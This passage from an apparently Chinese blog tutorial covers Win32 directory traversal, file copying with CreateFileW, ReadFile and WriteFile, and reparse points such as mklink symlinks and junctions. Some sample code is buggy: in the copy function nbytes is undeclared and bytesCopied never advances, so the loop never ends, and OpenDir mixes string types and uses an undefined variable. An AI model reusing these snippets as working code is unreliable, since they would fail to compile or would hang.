m_findFileData</code>中：</p>\n<blockquote>\n<p>Windows支持模式串作为遍历参数，例如<code>C:\\Users\\XUranus\\Desktop\\*.*</code>用于描述<code>C:\\Users\\XUranus\\Desktop</code>下所有的目录和文件。详见<a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilea\">FindFirstFileA function (fileapi.h)</a></p>\n</blockquote>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">std::optional&lt;OpenDirEntry&gt; <span class=\"title\">OpenDir</span><span class=\"params\">(<span class=\"keyword\">const</span> std::string&amp; wPath)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    std::wstring wpathPattern = wPath;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!wpathPattern.<span class=\"built_in\">empty</span>() &amp;&amp; wpathPattern.<span class=\"built_in\">back</span>() != <span class=\"string\">L&#x27;\\\\&#x27;</span>) &#123;</span><br><span class=\"line\">        wpathPattern.<span class=\"built_in\">push_back</span>(<span class=\"string\">L&#x27;\\\\&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    wpathPattern += <span class=\"string\">L&quot;*.*&quot;</span>;</span><br><span class=\"line\">    WIN32_FIND_DATAW findFileData&#123;&#125;;</span><br><span class=\"line\">    HANDLE fileHandle = ::<span class=\"built_in\">FindFirstFileW</span>(wpathPattern.<span class=\"built_in\">c_str</span>(), &amp;findFileData);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fileHandle == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> std::make_optional&lt;OpenDirEntry&gt;(path, findFileData, fileHandle);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">OpenDirEntry::Next</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (m_fileHandle == <span class=\"literal\">nullptr</span> || m_fileHandle == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!::<span class=\"built_in\">FindNextFileW</span>(m_fileHandle, &amp;m_findFileData)) &#123;</span><br><span class=\"line\">        m_fileHandle = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>遍历完成必须用<code>FindClose()</code>手动关闭打开目录的句柄，可以用RAII实现：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">OpenDirEntry::~<span class=\"built_in\">OpenDirEntry</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (m_fileHandle != <span class=\"literal\">nullptr</span> &amp;&amp; m_fileHandle != INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">FindClose</span>(m_fileHandle);</span><br><span class=\"line\">        m_fileHandle = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><code>WIN32_FIND_DATAW</code>定义如下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">WIN32_FIND_DATAW</span> &#123;</span></span><br><span class=\"line\">    DWORD dwFileAttributes;</span><br><span class=\"line\">    FILETIME ftCreationTime;</span><br><span class=\"line\">    FILETIME ftLastAccessTime;</span><br><span class=\"line\">    FILETIME ftLastWriteTime;</span><br><span class=\"line\">    DWORD nFileSizeHigh;</span><br><span class=\"line\">    DWORD nFileSizeLow;</span><br><span class=\"line\">    DWORD dwReserved0;</span><br><span class=\"line\">    DWORD dwReserved1;</span><br><span class=\"line\">    _Field_z_ WCHAR  cFileName[ MAX_PATH ];</span><br><span class=\"line\">    _Field_z_ WCHAR  cAlternateFileName[ <span class=\"number\">14</span> ];</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> _MAC</span></span><br><span class=\"line\">    DWORD dwFileType;</span><br><span class=\"line\">    DWORD dwCreatorType;</span><br><span class=\"line\">    WORD  wFinderFlags;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">&#125; WIN32_FIND_DATAW, *PWIN32_FIND_DATAW, *LPWIN32_FIND_DATAW;</span><br></pre></td></tr></table></figure><br>可以看到它拥有和<code>BY_HANDLE_FILE_INFORMATION</code>类似的成员，通过它可以实现判断当前入口的属性、名称、大小等信息：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">OpenDirEntry::IsDirectory</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (m_findFileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) != <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">std::string <span class=\"title\">OpenDirEntry::Name</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Utf16ToUtf8</span>(std::<span class=\"built_in\">wstring</span>(m_findFileData.cFileName));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"文件IO\"><a href=\"#文件IO\" class=\"headerlink\" title=\"文件IO\"></a>文件IO</h2><p>先回顾一下Linux下读取文件IO的流程：</p>\n<ol>\n<li><code>int fd = open(fname, mode)</code>获取文件的描述符</li>\n<li>用<code>read(fd, buf, sizeof(buf))</code>将数据读取buffer</li>\n<li>将<code>write(fd, buf, len)</code>将数据从buffer写入文件</li>\n<li>IO完成后用<code>close(fd)</code>释放资源</li>\n</ol>\n<p>Windows下遵循类似的流程：</p>\n<ol>\n<li><code>HANDLE hFile = CreateFileW()</code>获取打开文件句柄</li>\n<li><code>ReadFile</code>将文件部分读入buffer</li>\n<li><code>WriteFile</code>将buffer写入文件</li>\n<li>IO完成后用<code>CloseHandle(hFile)</code>释放资源</li>\n</ol>\n<p>基于上述逻辑实现一个拷贝文件的逻辑：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">Win32CopyFileW</span><span class=\"params\">(<span class=\"keyword\">const</span> std::wstring&amp; wSrcPath, <span class=\"keyword\">const</span> std::wstring&amp; wDstPath)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">int</span> DEFAULT_BUFF_SIZE = <span class=\"number\">1024</span>;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buff[DEFAULT_BUFF_SIZE] = <span class=\"string\">&quot;\\0&quot;</span>;</span><br><span class=\"line\">    <span class=\"comment\">/* open file for read */</span></span><br><span class=\"line\">    HANDLE hInFile = ::<span class=\"built_in\">CreateFileW</span>(</span><br><span class=\"line\">        wSrcPath.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">        GENERIC_READ,</span><br><span class=\"line\">        FILE_SHARE_READ,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        OPEN_EXISTING,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hInFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/* open file for write */</span></span><br><span class=\"line\">    HANDLE hOutFile = ::<span class=\"built_in\">CreateFileW</span>(</span><br><span class=\"line\">        wDstPath.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">        GENERIC_WRITE,</span><br><span class=\"line\">        FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        CREATE_NEW,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hOutFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">CloseHandle</span>(hInFile);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    LARGE_INTEGER sizeEx;</span><br><span class=\"line\">    ::<span class=\"built_in\">GetFileSizeEx</span>(hInFile, &amp;sizeEx);</span><br><span class=\"line\">    <span class=\"keyword\">uint64_t</span> bytesCopied = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">uint64_t</span> size = sizeEx.QuadPart;</span><br><span class=\"line\">    <span class=\"comment\">/* copy file */</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (size != bytesCopied) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">uint64_t</span> bytesLeft = size - bytesCopied;</span><br><span class=\"line\">        nbytes = bytesLeft &lt; <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(buff) ? bytesLeft : <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(buff);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!::<span class=\"built_in\">ReadFile</span>(hInFile, buff, nbytes, <span class=\"literal\">nullptr</span>, <span class=\"literal\">nullptr</span>)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">/* read failed */</span></span><br><span class=\"line\">            ::<span class=\"built_in\">CloseHandle</span>(hInFile);</span><br><span class=\"line\">            ::<span class=\"built_in\">CloseHandle</span>(hOutFile);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        DWORD nWritten = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!::<span class=\"built_in\">WriteFile</span>(hOutFile, buff, nbytes, &amp;nWritten, <span class=\"literal\">nullptr</span>)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">/* write failed */</span></span><br><span class=\"line\">            ::<span class=\"built_in\">CloseHandle</span>(hInFile);</span><br><span class=\"line\">            ::<span class=\"built_in\">CloseHandle</span>(hOutFile);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/* copy success */</span></span><br><span class=\"line\">    ::<span class=\"built_in\">CloseHandle</span>(hInFile);</span><br><span class=\"line\">    ::<span class=\"built_in\">CloseHandle</span>(hOutFile);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>打开文件后默认文件的读写指针从0开始，读写n后字节后当前读写指针偏移量会自动后移相应长度。Linux下如果想从指定偏移量读写文件可以用<code>lseek</code>来改变文件读写指针的位置，在Windows下这个函数是<code>SetFilePointer</code></p>\n<p>相关参考资料：</p>\n<blockquote>\n<p><a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile\">ReadFile function (fileapi.h)</a><br><a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile\">WriteFile function (fileapi.h)</a><br><a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfilepointer\">SetFilePointer function (fileapi.h)</a></p>\n</blockquote>\n","tags":["Windows"]},{"title":"Windows文件系统概述(二)指向点","url":"/2023/03/19/Windows%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F2/","content":"<blockquote>\n<p>上一篇文件我们主要介绍了Windows文件系统的基本特性及文档阅读方式，本文将介绍Windows文件系统中一种特殊的概念：<strong>指向点（Reparse Point）</strong></p>\n</blockquote>\n<p>回顾上一章节，我们在文件<code>dwFileAttributes</code>依据符号位<code>FILE_ATTRIBUTE_REPARSE_POINT</code>实现了一个方法：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">StatResult::IsReparsePoint</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (m_handleFileInformation.dwFileAttributes &amp; FILE_ATTRIBUTE_REPARSE_POINT) != <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们还没有说明这个方法的意义，该方法说明<strong>该文件是一个指向点（Reparse Point）</strong>。Reparse Point是一种特殊机制，用于实现Windows文件系统的重定向。Windows的挂载和软连接就是基于它实现的。在详解<code>FILE_ATTRIBUTE_REPARSE_POINT</code>之前，我们先从Windows软链接开始看起。</p>\n<h2 id=\"mklink\"><a href=\"#mklink\" class=\"headerlink\" title=\"mklink\"></a>mklink</h2><h3 id=\"创建软连接\"><a href=\"#创建软连接\" class=\"headerlink\" title=\"创建软连接\"></a>创建软连接</h3><p><code>cmd.exe</code>提供了<code>mklink</code>命令用于在Windows创建软链接：<br><figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">C:\\<span class=\"title\">Users</span>\\<span class=\"title\">XUranus</span>&gt;<span class=\"title\">mklink</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">MKLINK</span> [[/<span class=\"title\">D</span>] | [/<span class=\"title\">H</span>] | [/<span class=\"title\">J</span>]] <span class=\"title\">Link</span> <span class=\"title\">Target</span></span></span><br><span class=\"line\"><span class=\"function\">        /<span class=\"title\">D</span>      创建目录符号链接。默认为文件符号链接。</span></span><br><span class=\"line\"><span class=\"function\">        /<span class=\"title\">H</span>      创建硬链接而非符号链接。</span></span><br><span class=\"line\"><span class=\"function\">        /<span class=\"title\">J</span>      创建目录联接。</span></span><br><span class=\"line\"><span class=\"function\">        <span class=\"title\">Link</span>    指定新的符号链接名称。</span></span><br><span class=\"line\"><span class=\"function\">        <span class=\"title\">Target</span>  指定新链接引用的路径 (相对或绝对)。</span></span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<p><code>mklink</code>创建的软链接有两种：</p>\n<ul>\n<li>符号链接（Symbolic）</li>\n<li>目录链接（Junction）</li>\n</ul>\n<p><code>mklink</code>不指定<code>/D</code>或者<code>/J</code>创建出来的默认是文件符号链接，例如：<br><figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">C:\\&gt;<span class=\"title\">mklink</span> <span class=\"title\">C</span>:\\<span class=\"title\">symfile</span> <span class=\"title\">C</span>:\\<span class=\"title\">file.txt</span></span></span><br><span class=\"line\"><span class=\"function\">为 <span class=\"title\">C</span>:\\<span class=\"title\">symfile</span> &lt;&lt;===&gt;&gt; <span class=\"title\">C</span>:\\<span class=\"title\">file.txt</span> 创建的符号链接</span></span><br></pre></td></tr></table></figure></p>\n<p>此处<code>C:\\file.txt</code>是一个文本文件，<code>C:\\symfile</code>是指向它的文件符号链接。通过打开<code>C:\\symfile</code>可以打开<code>C:\\file.txt</code>。</p>\n<p><code>mklink</code>指定<code>/D</code>可以创建目录的符号链接，例如：<br><figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">C:\\&gt;<span class=\"title\">mkdir</span> <span class=\"title\">dir1</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">C</span>:\\&gt;<span class=\"title\">mklink</span> /<span class=\"title\">D</span> <span class=\"title\">C</span>:\\<span class=\"title\">symdir</span> <span class=\"title\">C</span>:\\<span class=\"title\">dir1</span></span></span><br><span class=\"line\"><span class=\"function\">为 <span class=\"title\">C</span>:\\<span class=\"title\">symdir</span> &lt;&lt;===&gt;&gt; <span class=\"title\">C</span>:\\<span class=\"title\">dir1</span> 创建的符号链接</span></span><br></pre></td></tr></table></figure><br>此处<code>C:\\dir1</code>是一个目录，创建一个指向它的<code>C:\\symdir</code>。在资源浏览器中它表现为一个目录，打开<code>C:\\symdir</code>目录可以重定向到<code>C:\\dir</code>。</p>\n<p><code>mklink</code>指定<code>/J</code>可以创建指向Target的目录链接（Junction）。例如：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\&gt;mkdir dir2</span><br><span class=\"line\">C:\\&gt;mklink /J C:\\junctiondir C:\\dir2</span><br><span class=\"line\">为 C:\\junctiondir &lt;&lt;===&gt;&gt; C:\\dir2 创建的符号链接</span><br></pre></td></tr></table></figure><br>此处<code>C:\\dir2</code>依旧是一个目录，创建一个指向它的<code>C:\\junctiondir</code>，在资源管理器中它依旧表现为一个目录，并且可以打开重定向到<code>C:\\dir2</code>。</p>\n<p>以上就是<code>mklink</code>正常创建符号链接的使用方法了，我们用表格对其使用各个参数创建出的链接类型做个总结：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>创建链接表现类型</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>不填</td>\n<td>文件</td>\n</tr>\n<tr>\n<td><code>/D</code></td>\n<td>目录</td>\n</tr>\n<tr>\n<td><code>/J</code></td>\n<td>目录</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>Symbolic和Junction在链接目录的时候表现相似，但他们并不是一类事物，区别主要反映在远端服务器的场景：<strong>Junction在服务端处理，而Symbolic在客户端处理</strong>。所以Junction不能指向远端文件，而Symbolic可以。同时创建Symbolic需要更高的权限，而创建Junction只需要文件系统的读写权限。详见：<a href=\"https://superuser.com/questions/343074/directory-junction-vs-directory-symbolic-link\">“directory junction” vs “directory symbolic link”?</a></p>\n<h3 id=\"失效软连接\"><a href=\"#失效软连接\" class=\"headerlink\" title=\"失效软连接\"></a>失效软连接</h3><p>需要注意的是，以上我们都只测试了<strong>目标路径存在</strong>，且<strong>目标类型和链接类型一致</strong>的正常场景。那么，如果参数声明和目标文件不一致会怎么样呢？如果目标文件根本不存在又会怎么样呢？</p>\n<p>如果指向目标是一个目录，并且不指定<code>/D</code>和<code>/J</code>，依然可以创建出一个<strong>指向目录的文件符号链接</strong>：<br><figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">C:\\&gt;<span class=\"title\">mklink</span> <span class=\"title\">C</span>:\\<span class=\"title\">sym1</span> <span class=\"title\">C</span>:\\<span class=\"title\">dir1</span></span></span><br><span class=\"line\"><span class=\"function\">为 <span class=\"title\">C</span>:\\<span class=\"title\">sym1</span> &lt;&lt;===&gt;&gt; <span class=\"title\">C</span>:\\<span class=\"title\">dir1</span> 创建的符号链接</span></span><br></pre></td></tr></table></figure><br>此处<code>C:\\dir1</code>是一个目录，创建一个指向它的<code>C:\\sym1</code>。在资源浏览器中它依然表现为一个文件，然而打开<code>C:\\sym1</code>并不能成功：<br><img src=\"\" alt=\"\"></p>\n<p>同理<code>mklink</code>可以创建一个<strong>指向文件的目录软连接</strong>或者一个<strong>指向文件的目录链接</strong>：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\&gt;mklink /D C:\\sym2 C:\\file.txt</span><br><span class=\"line\">为 C:\\sym2 &lt;&lt;===&gt;&gt; C:\\file.txt 创建的符号链接</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\&gt;mklink /D C:\\junction2 C:\\file.txt</span><br><span class=\"line\">为 C:\\junction2 &lt;&lt;===&gt;&gt; C:\\file.txt 创建的符号链接</span><br></pre></td></tr></table></figure><br><code>C:\\sym2</code>和<code>C:\\junction2</code>在资源管理器中表现都是一个目录，但是由于它指向一个文件，他也不能被重定向打开目标路径。</p>\n<p>更进一步，<code>mklink</code>可以任意指定Target来创建的符号链接，Target路径根本不存在，依然可以创建成功：<br><figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">C:\\&gt;<span class=\"title\">mklink</span> <span class=\"title\">C</span>:\\<span class=\"title\">invalidsym1</span> <span class=\"title\">C</span>:\\<span class=\"title\">path_not_exists</span></span></span><br><span class=\"line\"><span class=\"function\">为 <span class=\"title\">C</span>:\\<span class=\"title\">invalidsym1</span> &lt;&lt;===&gt;&gt; <span class=\"title\">C</span>:\\<span class=\"title\">path_not_exists</span> 创建的符号链接</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">C</span>:\\&gt;<span class=\"title\">mklink</span> <span class=\"title\">C</span>:\\<span class=\"title\">invalidsym2</span> /<span class=\"title\">D</span> <span class=\"title\">C</span>:\\<span class=\"title\">path_not_exists</span></span></span><br><span class=\"line\"><span class=\"function\">为 <span class=\"title\">C</span>:\\<span class=\"title\">invalidsym2</span> &lt;&lt;===&gt;&gt; <span class=\"title\">C</span>:\\<span class=\"title\">path_not_exists</span> 创建的符号链接</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">C</span>:\\&gt;<span class=\"title\">mklink</span> <span class=\"title\">C</span>:\\<span class=\"title\">invalidjunction3</span> /<span class=\"title\">D</span> <span class=\"title\">C</span>:\\<span class=\"title\">path_not_exists</span></span></span><br><span class=\"line\"><span class=\"function\">为 <span class=\"title\">C</span>:\\<span class=\"title\">invalidjunction3</span> &lt;&lt;===&gt;&gt; <span class=\"title\">C</span>:\\<span class=\"title\">path_not_exists</span> 创建的符号链接</span></span><br></pre></td></tr></table></figure></p>\n<p>我们把这类不能正常起到重定向作用的软连接成为<strong>失效的软连接</strong>。<code>mklink</code>创建软链接时候检查指向的目标路径是否存在，不会管目标路径是否是文件或目录。创建出的符号链接类型表现为目录还是文件只和创建时传入的参数有关。</p>\n<h3 id=\"级联软连接\"><a href=\"#级联软连接\" class=\"headerlink\" title=\"级联软连接\"></a>级联软连接</h3><p>由于软连接可以指任何路径，于是自然可以联想到软连接可以指向软连接：<br><figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">C:\\&gt;<span class=\"title\">mklink</span> <span class=\"title\">C</span>:\\<span class=\"title\">cascadesym1</span> <span class=\"title\">C</span>:\\<span class=\"title\">file.txt</span></span></span><br><span class=\"line\"><span class=\"function\">为 <span class=\"title\">C</span>:\\<span class=\"title\">cascadesym1</span> &lt;&lt;===&gt;&gt; <span class=\"title\">C</span>:\\<span class=\"title\">file.txt</span> 创建的符号链接</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">C</span>:\\&gt;<span class=\"title\">mklink</span> <span class=\"title\">C</span>:\\<span class=\"title\">cascadesym2</span> <span class=\"title\">C</span>:\\<span class=\"title\">cascadesym1</span></span></span><br><span class=\"line\"><span class=\"function\">为 <span class=\"title\">C</span>:\\<span class=\"title\">cascadesym2</span> &lt;&lt;===&gt;&gt; <span class=\"title\">C</span>:\\<span class=\"title\">cascadesym1</span> 创建的符号链接</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">C</span>:\\&gt;<span class=\"title\">mklink</span> <span class=\"title\">C</span>:\\<span class=\"title\">cascadesym3</span> <span class=\"title\">C</span>:\\<span class=\"title\">cascadesym2</span></span></span><br><span class=\"line\"><span class=\"function\">为 <span class=\"title\">C</span>:\\<span class=\"title\">cascadesym3</span> &lt;&lt;===&gt;&gt; <span class=\"title\">C</span>:\\<span class=\"title\">cascadesym2</span> 创建的符号链接</span></span><br></pre></td></tr></table></figure><br><code>C:\\cascadesym3</code>指向了<code>C:\\cascadesym2</code>，<code>C:\\cascadesym2</code>指向了<code>C:\\cascadesym1</code>，<code>C:\\cascadesym1</code>指向了<code>C:\\file.txt</code>。这三个符号链接都可以用来打开<code>C:\\file.txt</code>。说明<strong>Windows符号链接可以级联重定向</strong>。</p>\n<p>综上，Windows的软链接也可以理解为和Linux的Symlink一样，是一种存储了目标位置路径的特殊文件，通过重定向来访问指向的目标文件。</p>\n<h3 id=\"删除软链接\"><a href=\"#删除软链接\" class=\"headerlink\" title=\"删除软链接\"></a>删除软链接</h3><p>由于软连接只是一种存储目标文件的路径，于是删除和修改软连接不会影响到指向的目标文件。</p>\n<h2 id=\"Win32-API\"><a href=\"#Win32-API\" class=\"headerlink\" title=\"Win32 API\"></a>Win32 API</h2><p>了解了Windows软连接的基本概念后，我们从Win32 API的层面上来对其做进一步了解：<br>通过<code>GetFileAttributesW</code>查看软连接文件的<code>dwFileAttributes</code>属性：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// mklink /D C:\\sym1 C:\\dir</span></span><br><span class=\"line\"><span class=\"comment\">// C:\\sym1 &lt;==&gt; C:\\dir1</span></span><br><span class=\"line\">DWORD dwFileAttributes = ::<span class=\"built_in\">GetFileAttributesW</span>(<span class=\"string\">LR&quot;(C:\\sym1)&quot;</span>);</span><br><span class=\"line\">std::cout &lt;&lt; (dwFileAttributes &amp; FILE_ATTRIBUTE_REPARSE_POINT) &lt;&lt; std::endl;; <span class=\"comment\">// 1 </span></span><br><span class=\"line\">std::cout &lt;&lt; (dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) &lt;&lt; std::endl;; <span class=\"comment\">// 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// mklink C:\\symfile C:\\file.txt</span></span><br><span class=\"line\"><span class=\"comment\">// C:\\symfile &lt;==&gt; C:\\file.txt</span></span><br><span class=\"line\">dwFileAttributes = ::<span class=\"built_in\">GetFileAttributesW</span>(<span class=\"string\">LR&quot;(C:\\symfile)&quot;</span>);</span><br><span class=\"line\">std::cout &lt;&lt; (dwFileAttributes &amp; FILE_ATTRIBUTE_REPARSE_POINT) &lt;&lt; std::endl;; <span class=\"comment\">// 1 </span></span><br><span class=\"line\">std::cout &lt;&lt; (dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) &lt;&lt; std::endl;; <span class=\"comment\">// 0</span></span><br></pre></td></tr></table></figure><br>可以看到他们都有<code>FILE_ATTRIBUTE_REPARSE_POINT</code>符号位，每个软连接文件是否有<code>FILE_ATTRIBUTE_DIRECTORY</code>符号位只取决于创建他们的时候声明的参数。</p>\n<p>在上一篇中我们封装了获取Windows文件信息的<code>StatW()</code>方法<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">std::optional&lt;StatResult&gt; <span class=\"title\">StatW</span><span class=\"params\">(<span class=\"keyword\">const</span> std::wstring&amp; wPath)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    BY_HANDLE_FILE_INFORMATION handleFileInformation&#123;&#125;;</span><br><span class=\"line\">    HANDLE hFile = ::<span class=\"built_in\">CreateFileW</span>(</span><br><span class=\"line\">        wPath.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">        GENERIC_READ,</span><br><span class=\"line\">        FILE_SHARE_READ,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        OPEN_EXISTING,</span><br><span class=\"line\">        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,</span><br><span class=\"line\">        <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (::<span class=\"built_in\">GetFileInformationByHandle</span>(hFile, &amp;handleFileInformation) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ::<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> std::make_optional&lt;StatResult&gt;(wPath, handleFileInformation);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>在<code>CreateFileW()</code>的第6个参数中我们传入了一个<code>FILE_FLAG_OPEN_REPARSE_POINT</code>符号位，该符号位用于告知系统：<strong>不要对Reparse Point重定向</strong>。传入该符号位，如果路径对应的文件是软连接文件，则会返回<strong>其自身的句柄</strong>。反之则会触发重定向，重定向会级联触发直到找到最终指向的Target文件的句柄并返回，如果中途失败则打开失败返回<code>INVALID_HANDLE_VALUE</code>。</p>\n<blockquote>\n<p>除了<code>CreateFileW()</code>还有一系列涉及路径的Windows 